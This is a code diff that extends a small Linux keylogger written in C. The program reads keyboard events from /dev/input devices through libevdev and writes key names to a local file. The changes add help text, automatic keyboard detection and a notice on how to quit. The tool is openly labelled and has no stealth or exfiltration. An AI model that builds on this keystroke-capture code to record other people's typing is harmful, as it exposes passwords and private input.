@@ -6,9 +6,19 @@
 #include <string.h>
 #include <libevdev-1.0/libevdev/libevdev.h>
 
+#include "KeyloggerFunc.h"
+
 #define KEY_LOG_FILE "./keylog.txt"
 
-int main() {
+int main(int argc, char *argv[]) {
+	// Before I start, I check if the user needs help
+    if (argc > 1 && (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0)) {
+        printf("This Keylogger will simply record the keyboard inputs and will write them to a KEY_LOG_FILE\n");
+		printf("It will read through all of the /dev/input/event files to look for your keyboard, so you don't have too\n");
+		printf("It will then record each event that goes to the keyboard and write it to the file");
+        return 0;
+    }
+
 	int fd;
 	FILE *logfile; 
 	// I made this 1 because I don't feel like doing ==0 later
@@ -24,13 +34,9 @@ int main() {
 		printf("ERROR: This needs to be ran as root\n");
 		return(EXIT_FAILURE);
 	} 
-	// read inputs, -h|--help -o|--output 
-	// Get keyboard arr
-	// make a thread for every keyboard found
-	// The keylogging found below will live inside the threat we make
-
+	// TODO: make a thread for every keyboard find as opposed to just utiling the first one we find
 	// Open keyboard device (event interface)
-	if ((fd = open("/dev/input/event16", O_RDONLY)) == -1) {
+	if ((fd = open(find_keyboards(), O_RDONLY)) == -1) {
 		perror("Cannot open keyboard device");
 		exit(EXIT_FAILURE);
 	}
@@ -43,8 +49,9 @@ int main() {
 		exit(EXIT_FAILURE);
 	}
 
-	printf("Keylogger started. Logging to %s\n", KEY_LOG_FILE);
+	printf("Keylogger started, press CTRL+C to close the program\nNow logging to %s\n", KEY_LOG_FILE);
 
+	// I could bring in an interput to close out of the while loop, but I think CTRL+C works just fine for this application
 	while (read(fd, &ie, sizeof(struct input_event))) {
 		if (ie.type == EV_KEY) {
 			const char *key_name = libevdev_event_code_get_name(ie.type, ie.code);
